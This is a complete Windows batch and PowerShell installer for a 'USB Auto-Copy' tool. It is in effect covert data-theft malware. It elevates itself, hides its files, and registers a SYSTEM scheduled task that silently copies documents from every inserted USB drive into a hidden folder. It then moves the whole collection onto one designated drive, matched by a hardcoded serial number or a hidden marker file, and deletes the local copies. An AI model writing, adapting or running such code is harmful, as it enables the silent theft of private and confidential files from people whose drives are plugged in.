@echo off
:: ============================================================
:: USB Auto-Copy System - Silent Installer
:: ============================================================
:: Double-click ONCE to install.
:: USB documents are then copied automatically and silently.
:: Double-click again to reinstall or uninstall.
:: ============================================================
:: Auto-Elevate to Administrator
net session >nul 2>&1
if %errorLevel% neq 0 (powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs" & exit /b)
set "T=%TEMP%\uac_%RANDOM%.ps1"
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$c=Get-Content -LiteralPath '%~f0'; Set-Content -LiteralPath '%T%' -Value $c[14..($c.Count-1)] -Encoding UTF8"
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%T%" & del "%T%" 2>nul & exit /b

$DestRoot    = 'C:\Windows\Docs'
$InstallDir  = Join-Path $DestRoot 'SYSCOPY'
$MonitorPS1  = Join-Path $InstallDir 'usb_monitor.ps1'
$LauncherVBS = Join-Path $InstallDir 'usb_launcher.vbs'
$TaskName    = 'USB_AutoCopy_Silent_Monitor'

Add-Type -AssemblyName System.Windows.Forms
$nl = [Environment]::NewLine

# Create directories
foreach ($dir in @($DestRoot, $InstallDir)) {
    if (-not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
}
try { (Get-Item -LiteralPath $InstallDir -Force).Attributes = (Get-Item -LiteralPath $InstallDir -Force).Attributes -bor [IO.FileAttributes]::Hidden } catch {}

# Check if already installed
$existingTask = $null
try { $existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction Stop } catch {}

if ($existingTask) {
    Add-Type -AssemblyName System.Drawing
    $form = New-Object System.Windows.Forms.Form
    $form.Text = 'USB Auto-Copy Setup'
    $form.Size = New-Object System.Drawing.Size(320,130)
    $form.StartPosition = 'CenterScreen'
    $form.FormBorderStyle = 'FixedDialog'
    $form.MaximizeBox = $false
    $form.MinimizeBox = $false
    
    $label = New-Object System.Windows.Forms.Label
    $label.Location = New-Object System.Drawing.Point(10,15)
    $label.Size = New-Object System.Drawing.Size(280,20)
    $label.Text = 'USB Auto-Copy is already installed.'
    $label.AutoSize = $true
    $form.Controls.Add($label)

    $btnUpdate = New-Object System.Windows.Forms.Button
    $btnUpdate.Location = New-Object System.Drawing.Point(15,50)
    $btnUpdate.Size = New-Object System.Drawing.Size(80,30)
    $btnUpdate.Text = 'Update'
    $btnUpdate.DialogResult = 'Yes'
    $form.Controls.Add($btnUpdate)

    $btnUninstall = New-Object System.Windows.Forms.Button
    $btnUninstall.Location = New-Object System.Drawing.Point(105,50)
    $btnUninstall.Size = New-Object System.Drawing.Size(80,30)
    $btnUninstall.Text = 'Uninstall'
    $btnUninstall.DialogResult = 'No'
    $form.Controls.Add($btnUninstall)

    $btnCancel = New-Object System.Windows.Forms.Button
    $btnCancel.Location = New-Object System.Drawing.Point(195,50)
    $btnCancel.Size = New-Object System.Drawing.Size(80,30)
    $btnCancel.Text = 'Cancel'
    $btnCancel.DialogResult = 'Cancel'
    $form.Controls.Add($btnCancel)

    $form.AcceptButton = $btnUpdate
    $form.CancelButton = $btnCancel
    $form.TopMost = $true

    $result = $form.ShowDialog()

    if ($result -eq 'No') {
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
        Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -match 'usb_monitor.ps1' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
        if (Test-Path -LiteralPath $InstallDir) { Remove-Item -LiteralPath $InstallDir -Recurse -Force -ErrorAction SilentlyContinue }
        [System.Windows.Forms.MessageBox]::Show('Uninstalled successfully. Your documents in C:\Windows\Docs are kept safe.', 'USB Auto-Copy', 'OK', 'Information') | Out-Null
        exit
    }
    if ($result -eq 'Cancel') { exit }
    
    # YES => Uninstall first, then reinstall
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -match 'usb_monitor.ps1' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
}

# --- Create Monitor Script ---
$monitorCode = @'
# USB Auto-Copy Monitor - Runs silently in background
$mutex = New-Object System.Threading.Mutex([bool]0, 'USBAutoCopyMonitorMutex')
if (-not $mutex.WaitOne(0, [bool]0)) { exit }

$DestRoot = 'C:\Windows\Docs'
$InstallDir = Join-Path $DestRoot 'SYSCOPY'
if (-not (Test-Path -LiteralPath $DestRoot)) { New-Item -ItemType Directory -Path $DestRoot -Force | Out-Null }
$LogFile = Join-Path $DestRoot '.autocopy_log.txt'
$Exts = @('*.pdf','*.pptx','*.ppt','*.docx','*.doc','*.xlsx','*.xls')

while ([bool]1) {
    try {
        $drives = @(Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 })
        foreach ($drv in $drives) {
            $root = $drv.DeviceID + '\'
            $serial = $drv.VolumeSerialNumber
            $label = $drv.VolumeName
            if ([string]::IsNullOrWhiteSpace($label)) { $label = 'USB_' + $drv.DeviceID[0] }
            
            # Using serial number ensures different pendrives with SAME name get DIFFERENT folders!
            if ($serial -eq '702968E6' -or (Test-Path -LiteralPath (Join-Path $root '.syscopy_target'))) {
                $targetFile = Join-Path $root '.syscopy_target'
                if (-not (Test-Path -LiteralPath $targetFile)) {
                    Set-Content -LiteralPath $targetFile -Value 'SYSCOPY_TARGET_DRIVE' -Encoding UTF8 -ErrorAction SilentlyContinue
                    try { (Get-Item -LiteralPath $targetFile).Attributes = 'Hidden' } catch {}
                }
                $docsFolder = Join-Path $root 'docs'
                if (-not (Test-Path -LiteralPath $docsFolder)) { New-Item -ItemType Directory -Path $docsFolder -Force | Out-Null }
                
                $copied = 0
                foreach ($ext in $Exts) {
                    $files = @(Get-ChildItem -Path $DestRoot -Filter $ext -Recurse -File -ErrorAction SilentlyContinue | Where-Object { -not $_.FullName.StartsWith($InstallDir, [StringComparison]::OrdinalIgnoreCase) })
                    foreach ($file in $files) {
                        $relPath = $file.FullName.Substring($DestRoot.Length)
                        if ($relPath.StartsWith('\')) { $relPath = $relPath.Substring(1) }
                        $dest = Join-Path $docsFolder $relPath
                        $destFolder = Split-Path $dest -Parent
                        if (-not (Test-Path -LiteralPath $destFolder)) { New-Item -ItemType Directory -Path $destFolder -Force | Out-Null }
                        try {
                            $shouldMove = $false
                            if (-not (Test-Path -LiteralPath $dest)) {
                                $shouldMove = $true
                            } else {
                                $destItem = Get-Item -LiteralPath $dest
                                if ($destItem.LastWriteTime -lt $file.LastWriteTime -or $destItem.Length -ne $file.Length) {
                                    $shouldMove = $true
                                }
                            }
                            if ($shouldMove) {
                                Copy-Item -LiteralPath $file.FullName -Destination $dest -Force -ErrorAction Stop
                                Remove-Item -LiteralPath $file.FullName -Force -ErrorAction SilentlyContinue
                                $copied++
                            }
                        } catch {}
                    }
                }
                if ($copied -gt 0) {
                    # Cleanup empty folders
                    Get-ChildItem -Path $DestRoot -Directory -Recurse -ErrorAction SilentlyContinue | Where-Object {
                        -not $_.FullName.StartsWith($InstallDir, [StringComparison]::OrdinalIgnoreCase) -and @(Get-ChildItem -Path $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0
                    } | Sort-Object -Property FullName -Descending | Remove-Item -Force -ErrorAction SilentlyContinue

                    $entry = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' | ' + $label + ' (' + $serial + ') | ' + $copied + ' files MOVED to USB'
                    Add-Content -LiteralPath $LogFile -Value $entry -ErrorAction SilentlyContinue
                }
            } else {
                $safeName = ($label.Trim() + ' (' + $serial + ')') -replace '[\\/:*?"<>|]', '_'
                $destDir = Join-Path $DestRoot $safeName
                
                if (-not (Test-Path -LiteralPath $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }
                
                $copied = 0
                foreach ($ext in $Exts) {
                    $files = @(Get-ChildItem -Path $root -Filter $ext -Recurse -File -ErrorAction SilentlyContinue)
                    foreach ($file in $files) {
                        # Preserve folder structure from USB
                        $relPath = $file.FullName.Substring($root.Length)
                        $dest = Join-Path $destDir $relPath
                        $destFolder = Split-Path $dest -Parent
                        if (-not (Test-Path -LiteralPath $destFolder)) { New-Item -ItemType Directory -Path $destFolder -Force | Out-Null }
                        try {
                            if (-not (Test-Path -LiteralPath $dest)) {
                                Copy-Item -LiteralPath $file.FullName -Destination $dest -ErrorAction Stop
                                $copied++
                            }
                            elseif ((Get-Item -LiteralPath $dest).Length -ne $file.Length) {
                                $base = [IO.Path]::GetFileNameWithoutExtension($file.Name)
                                $fext = [IO.Path]::GetExtension($file.Name)
                                $destParent = Split-Path $dest -Parent
                                $n = 1
                                do {
                                    $newDest = Join-Path $destParent ($base + '_(' + $n + ')' + $fext)
                                    $n++
                                } while (Test-Path -LiteralPath $newDest)
                                Copy-Item -LiteralPath $file.FullName -Destination $newDest -ErrorAction Stop
                                $copied++
                            }
                        } catch {}
                    }
                }
                if ($copied -gt 0) {
                    $entry = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' | ' + $label + ' (' + $serial + ') | ' + $copied + ' files copied to [' + $safeName + ']'
                    Add-Content -LiteralPath $LogFile -Value $entry -ErrorAction SilentlyContinue
                }
            }
        }
    } catch {}
    
    # Sleeps for 5 seconds between checks - ensures instant detection of new USBs!
    Start-Sleep -Seconds 5
}
'@

Set-Content -LiteralPath $MonitorPS1 -Value $monitorCode -Encoding UTF8

# --- Create VBS Launcher ---
$vbsCode = @'
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)
ps1File = scriptDir & "\usb_monitor.ps1"

' Wait a few seconds on startup to let filesystem settle
WScript.Sleep 3000

' Verify file exists before trying to run it (prevents popup errors)
If Not fso.FileExists(ps1File) Then
    WScript.Quit
End If

Set sh = CreateObject("Wscript.Shell")
cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & ps1File & """"
sh.Run cmd, 0, False
'@

Set-Content -LiteralPath $LauncherVBS -Value $vbsCode -Encoding ASCII

# --- Create Scheduled Task ---
$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument ('"' + $LauncherVBS + '"')
$triggerLogon = New-ScheduledTaskTrigger -AtLogOn
# Only use AtLogOn - AtStartup runs too early (before user session/filesystem ready) and causes popup errors
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Seconds 0)
$registered = $false

try {
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger @($triggerLogon) -Settings $settings -Principal $principal -Description 'USB Auto-Copy Monitor' -Force | Out-Null
    $registered = [bool]1
} catch {
    try {
        $trArg = 'wscript.exe "' + $LauncherVBS + '"'
        Start-Process 'schtasks.exe' -ArgumentList @('/create', '/tn', $TaskName, '/tr', $trArg, '/sc', 'ONLOGON', '/f', '/ru', 'SYSTEM', '/rl', 'HIGHEST') -Wait -WindowStyle Hidden -ErrorAction Stop
        $registered = [bool]1
    } catch {}
}

# --- Start immediately ---
try { Start-Process 'wscript.exe' -ArgumentList ('"' + $LauncherVBS + '"') -WindowStyle Hidden -ErrorAction SilentlyContinue } catch {}

# --- Notify User ---
if ($registered) {
    $msg = 'USB Auto-Copy installed successfully!' + $nl + $nl
    $msg += '- Location: All documents go directly to C:\Windows\Docs' + $nl
    $msg += '- Smart Detection: Same-name pendrives are detected securely by hardware serial number and separated.' + $nl
    $msg += '- Instant: Automatically detects within 5 seconds when ANY USB is plugged in.' + $nl
    $msg += '- Completely Silent: No black screens, zero notifications.' + $nl + $nl
    $msg += 'To uninstall: Just double-click this file again.'
    [System.Windows.Forms.MessageBox]::Show($msg, 'USB Auto-Copy - Ready', 'OK', 'Information') | Out-Null
} else {
    [System.Windows.Forms.MessageBox]::Show('Installation failed. Please right-click and Run as Administrator.', 'USB Auto-Copy', 'OK', 'Warning') | Out-Null
}
